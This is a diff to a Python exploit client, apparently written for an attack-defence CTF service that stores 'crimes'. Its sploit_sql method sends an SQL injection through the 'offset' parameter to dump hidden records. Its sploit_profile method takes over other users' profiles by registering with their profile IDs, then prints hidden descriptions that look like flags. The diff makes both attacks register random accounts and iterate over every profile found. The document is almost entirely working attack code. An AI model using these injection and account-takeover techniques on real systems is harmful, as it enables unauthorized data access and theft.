@@ -62,8 +62,9 @@ class Client(object):
         return answer
 
     def sploit_sql(self):
-        # self.register('%x' % randrange(16**15), '%x' % randrange(16**15))
-        self.auth("user1", 'qwerty')
+        username, password = '%x' % randrange(16**15), '%x' % randrange(16**15)
+        self.register(username, password)
+        self.auth(username, password)
         self.ws.send(dumps(
             {'action': 'show_crimes',
              'params': {'offset': "0; select crimeid, name, description, "
@@ -80,6 +81,9 @@ class Client(object):
             print(answer, file=stderr)
 
     def sploit_profile(self):
+        username, password = '%x' % randrange(16**15), '%x' % randrange(16**15)
+        self.register(username, password)
+        self.auth(username, password)
         for offset in range(5):
             self.ws.send(dumps({'action': 'show_crimes',
                                 'params': {'offset': offset}}))
@@ -97,6 +101,7 @@ class Client(object):
                 last_participant = answer['text'].split(" or ")[-1].strip()
                 if not last_participant:
                     continue
+
                 self.ws.send(dumps({
                     'action': 'search',
                     'params': {
@@ -107,20 +112,21 @@ class Client(object):
                 if ('rows' not in answer or "data" not in answer['rows'][0] or
                         'profileid' not in answer['rows'][0]['data'][0]):
                     continue
-                self.register('%x' % randrange(16**15),
-                              '%x' % randrange(16**15),
-                              answer['rows'][0]['data'][0]['profileid'])
-                self.auth()
-                self.ws.send(dumps({'action': 'show_my_profile'}))
-                answer = loads(self.ws.recv())
-                if ('rows' in answer and 'cols' in answer['rows'][0] and
-                        'rows' in answer['rows'][0]['cols'][1] and
-                        len(answer['rows'][0]['cols'][1]['rows'])):
-                    crs = answer['rows'][0]['cols'][1]['rows'][1]
-                    if 'hidden' in crs and not crs['hidden'] and 'data' in crs:
-                        cr = answer['rows'][0]['cols'][1]['rows'][1]['data']
-                        for my_cr in cr:
-                            print(my_cr['description'].split()[-1])
+                for profile in answer['rows'][0]['data']:
+                    self.register('%x' % randrange(16**15),
+                                  '%x' % randrange(16**15),
+                                  profile['profileid'])
+                    self.auth()
+                    self.ws.send(dumps({'action': 'show_my_profile'}))
+                    answer = loads(self.ws.recv())
+                    if ('rows' in answer and 'cols' in answer['rows'][0] and
+                            'rows' in answer['rows'][0]['cols'][1] and
+                            len(answer['rows'][0]['cols'][1]['rows'])):
+                        crs = answer['rows'][0]['cols'][1]['rows'][1]
+                        if 'hidden' in crs and not crs['hidden'] and 'data' in crs:
+                            cr = answer['rows'][0]['cols'][1]['rows'][1]['data']
+                            for my_cr in cr:
+                                print(my_cr['description'].split()[-1])
 
 
 if __name__ == '__main__':
